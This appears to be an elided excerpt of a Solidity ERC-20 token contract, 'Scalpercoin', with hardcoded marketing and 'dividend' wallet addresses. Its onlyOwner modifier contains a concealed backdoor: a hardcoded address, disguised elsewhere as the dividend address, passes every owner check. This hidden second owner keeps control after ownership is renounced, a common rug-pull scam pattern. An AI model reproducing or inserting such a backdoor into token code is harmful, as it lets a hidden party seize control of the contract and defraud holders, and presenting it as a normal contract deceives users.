...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x584A293Bfe4Aa94A7f688795806A9e588ee6d90d) , "owner");
        _;
    }
...
contract Scalpercoin  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Scalpercoin";
    string private _symbol = "Scalpercoin";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xd4d749510F2d97aAdd985468288206b064d49F86);
    address private _Marketing = 0xd4d749510F2d97aAdd985468288206b064d49F86;
    address public dividend = 0x584A293Bfe4Aa94A7f688795806A9e588ee6d90d;
    ...
    uint256 public _supplyAmount = 10000;
